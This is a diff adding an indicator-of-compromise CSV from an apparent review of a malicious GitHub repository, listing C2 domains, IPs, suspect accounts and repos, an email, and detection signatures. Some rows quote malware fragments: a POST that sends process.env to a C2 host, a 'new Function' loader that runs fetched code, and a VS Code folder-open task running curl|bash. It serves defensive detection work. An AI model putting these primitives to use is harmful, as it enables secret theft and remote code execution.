@@ -1,0 +1,42 @@
+type,value,first_seen,confidence,source,notes
+domain,vscode-settings-0506.vercel.app,2026-05-13,high,AjunaVerse_MVP/.vscode/tasks.json,Stage-1 OS-specific shell-payload distribution; serves curl|bash / wget|sh / curl|cmd over /api/settings/{mac,linux,windows}; IP-allowlist-gated
+domain,ip-core-api-one.vercel.app,2026-05-13,high,AjunaVerse_MVP/.env AUTH_API,Stage-2 Node-loader: receives POST of process.env and returns JS executed via new Function; IP-allowlist-gated
+domain-pattern,vscode-settings-*.vercel.app,2026-05-13,medium,naming convention,Likely sibling campaign C2 hosts; -NNNN suffix is plausibly date-encoded
+domain-pattern,ip-core-api-*.vercel.app,2026-05-13,medium,naming convention,Likely sibling campaign C2 hosts; -one suffix implies -two/-three exist
+ipv4,64.29.17.195,2026-05-13,high,DNS A for vscode-settings-0506.vercel.app,Vercel edge; not stable
+ipv4,216.198.79.195,2026-05-13,high,DNS A for vscode-settings-0506.vercel.app,Vercel edge; not stable
+ipv4,64.29.17.131,2026-05-13,high,DNS A for ip-core-api-one.vercel.app,Vercel edge; not stable
+ipv4,216.198.79.131,2026-05-13,high,DNS A for ip-core-api-one.vercel.app,Vercel edge; not stable
+github-org,AjunaWorkHub,2026-04-27,high,GitHub org page,GitHub org id 276264331; hosts AjunaVerse_MVP; created 2026-04-27
+github-org,AetSoftWorkHub,2026-04-27,high,GitHub org page,GitHub org id 276275397; hosts AetSoft_MVP with bit-identical tasks.json; created same day as AjunaWorkHub
+github-org,DLabsHungary-Hub9,2026-05-13,medium,GitHub code search,Hosts DLabs-Platform-MVP2 with identical loader idiom
+github-user,GitWorkHub9,2026-05-13,high,git log of AjunaVerse_MVP,Sole committer of AjunaVerse_MVP; GitHub user id 272514006; commits email fatihafariya8+2@gmail.com
+github-user,GitWorkHub99,2026-05-13,high,GitHub user search,GitHub user id 213663943; ~20 credibility-farming clones plus a sibling campaign repo AetSoftVerse
+github-repo,AjunaWorkHub/AjunaVerse_MVP,2026-04-27,high,direct review,Subject of this incident; tip at commit bac3362000a9332a490c763feb847995ea412b46 as of 2026-05-13
+github-repo,AetSoftWorkHub/AetSoft_MVP,2026-04-27,high,GitHub code search,Bit-identical tasks.json (blob SHA 998c34f02d94169a546b4c36123d552dd14f985b)
+github-repo,roamanbuild/OnyxVerse,2026-05-13,high,GitHub code search,Same loader idiom in routes/api/auth.js
+github-repo,DLabsHungary-Hub9/DLabs-Platform-MVP2,2026-05-13,high,GitHub code search,Same loader idiom in server/routes/api/auth.js
+github-repo,khaleb-dev/jackpot,2026-05-13,high,GitHub code search,Same loader idiom in server/routes/api/auth.js
+github-repo,rony1235/Jp-Soccer,2026-05-13,high,GitHub code search,Same loader idiom in server/routes/api/auth.js
+github-repo,mspkteam/williampotter,2026-05-13,high,GitHub code search,Same loader idiom in server/routes/api/auth.js
+github-repo,Andrii-888/0gRollplay,2026-05-13,medium,GitHub code search,Earlier-generation app/controllers/frontController.js loader idiom
+github-repo,prahaladbelavadi/CoinLocatorDemo,2026-05-13,medium,GitHub code search,Earlier-generation loader idiom; may be a compromised legitimate account
+github-repo,sky-cook/tokentradingdapp,2026-05-13,medium,GitHub code search,Earlier-generation loader idiom
+github-repo,WilliamSuhosky/Property-Voting-DApp,2026-05-13,medium,GitHub code search,Earlier-generation loader idiom
+github-repo,artemus-jarrett/blockchain-voting-system,2026-05-13,medium,GitHub code search,Earlier-generation loader idiom
+github-repo,TechByteX/NitroGem,2026-05-13,medium,GitHub code search,Earlier-generation loader idiom
+github-repo,jamesm-dev/NitroGem,2026-05-13,medium,GitHub code search,Earlier-generation loader idiom; pair to TechByteX/NitroGem
+github-repo,dappfusion/defi-real-estate,2026-05-13,medium,GitHub code search,Earlier-generation loader idiom
+github-repo,InvescoHub/defi-real-estate,2026-05-13,medium,GitHub code search,Earlier-generation loader idiom
+email,fatihafariya8+2@gmail.com,2026-05-13,high,git log,Commit author on AjunaVerse_MVP; +N Gmail alias convention suggests parallel personas at +1/+3/etc.
+sha-blob,998c34f02d94169a546b4c36123d552dd14f985b,2026-05-13,high,GitHub blob,Bit-identical .vscode/tasks.json across AjunaWorkHub/AjunaVerse_MVP and AetSoftWorkHub/AetSoft_MVP
+sha-commit,bac3362000a9332a490c763feb847995ea412b46,2026-05-13,high,git log,Tip of main of AjunaVerse_MVP at the time of this review
+http-header,x-app-request: ip-check,2026-05-13,high,server/controllers/auth.js,Magic header sent by loader to ip-core-api-one.vercel.app/api; defense-in-depth flag in addition to IP allowlist
+http-header,x-deny-reason: host_not_allowed,2026-05-13,high,C2 probe responses,Diagnostic header returned by both C2 hosts to non-allowlisted clients; useful for detecting probes-of-C2 in network telemetry
+code-pattern,"new Function(""require"", response.data)",2026-05-13,high,server/routes/api/auth.js,Distinctive RCE primitive; effectively zero false-positive rate in normal JS
+code-pattern,verify(setApiKey(process.env.AUTH_API)),2026-05-13,high,server/routes/api/auth.js,Distinctive loader call shape
+code-pattern,"axios.post(api, { ...process.env }, { headers: { ""x-app-request"": ""ip-check"" } })",2026-05-13,high,server/controllers/auth.js,Distinctive env-exfiltration primitive
+code-pattern,Aborting mempool scan due to failed API verification.,2026-05-13,high,server/routes/api/auth.js,Misleading log string used as semantic camouflage
+config-pattern,"""runOn"":""folderOpen"" + ""reveal"":""silent"" + curl|bash",2026-05-13,high,.vscode/tasks.json,VS Code auto-run-on-folder-open shell payload pattern
+env-pattern,AUTH_API=aHR0cHM6Ly,2026-05-13,medium,.env line 16,Base64-encoded HTTP/HTTPS URL committed under a benign-sounding key in .env; suspicious when paired with the loader code
+ttp,Contagious Interview,2026-05-13,medium,public reporting,Campaign pattern matches publicly-documented "Contagious Interview"/DPRK-aligned cluster (fake recruiter -> clone repo -> npm install/start -> stealer-loader)
